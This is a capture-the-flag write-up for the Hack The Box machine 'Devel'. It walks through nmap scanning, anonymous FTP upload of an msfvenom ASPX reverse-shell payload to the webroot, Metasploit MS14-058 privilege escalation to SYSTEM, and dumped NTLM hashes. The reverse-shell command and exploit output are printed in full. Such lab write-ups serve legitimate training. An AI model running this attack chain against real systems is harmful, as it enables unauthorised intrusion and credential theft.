# Hackthebox Devel

Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.

### Attack Summary

1. Anonymous ftp access
2. Aspx shell upload
3. MS14_058 local exploit


## Recon

### Service Discovey

First, as always. we perform our initial enumeration of the box using Nmap.

``` 
# Nmap 7.70 scan initiated Thu Dec 27 09:57:38 2018 as: nmap -v -sV -p- -T4 -oA devel_tcp_full 10.10.10.5
Increasing send delay for 10.10.10.5 from 0 to 5 due to 19 out of 47 dropped probes since last increase.
Increasing send delay for 10.10.10.5 from 5 to 10 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for 10.10.10.5
Host is up (0.067s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
So we found two open services, one FTP server and one HTTP server. Let's start from the top and check the FTP server.

The first thing I always do is to check if the server allows anynymous connections. There are several ways we could test this, I usually just try it manually, but let's use a nmap script this time.

```
root@kali:~/htb/devel# nmap -v -sV -p21 --script ftp-anon.nse 10.10.10.5


Nmap scan report for 10.10.10.5
Host is up (0.064s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Okej, se it seems that we can get anonymous access to the ftp server. And by the looks of the files we see I would say that we are in the webroot of the weberver. 

If we are able to upload files through the FTP directly in the webroot, we could potentially upload a webshell and get RCE on the webserver.


## Initial Compromise

### RCE on weberver

Let's generate a aspx payload with msfvenom and try to upload it.

```
root@kali:~/htb/devel# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put meterpreter.aspx
local: meterpreter.aspx remote: meterpreter.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2849 bytes sent in 0.00 secs (37.2194 MB/s)
ftp> 
```

Msfvenom payload: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f aspx -o meterpreter.aspx`

Then we should only need to request the shell through a browser with the following URL: http://10.10.10.5/meterpreter.aspx

```
msf exploit(multi/handler) > 
[*] Sending stage (179779 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.10.10.5:49158) at 2018-12-27 10:44:37 +0100

msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo 
Computer        : DEVEL
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > getuid 
Server username: IIS APPPOOL\Web
```


## Pivilege Escalation

If I have a limited meterpreter shell on a Windows box I usually use the exploit suggester module. It will search for possible working privesc exploits that exists within Metasploit.

```
msf post(multi/recon/local_exploit_suggester) > exploit 

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 28 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

### MS14 058 track_popup_menu exploit

The search found a couple of exploits that we could try. I will try the MS14_058 as that one usually is pretty reliable.

```
msf exploit(windows/local/ms14_058_track_popup_menu) > exploit 

[*] Started reverse TCP handler on 10.10.14.12:4443 
[*] Launching notepad to host the exploit...
[+] Process 3772 launched.
[*] Reflectively injecting the exploit DLL into 3772...
[*] Injecting exploit into 3772...
[*] Exploit injected. Injecting payload into 3772...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (179779 bytes) to 10.10.10.5
[*] Meterpreter session 3 opened (10.10.14.12:4443 -> 10.10.10.5:49158) at 2018-12-27 10:54:25 +0100

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

Bingo, we are system.

## Dumping Credentials

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a450f6000be7df50ee304d0a838d638f:::
babis:1000:aad3b435b51404eeaad3b435b51404ee:a1133ec0f7779e215acc8a36922acf57:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```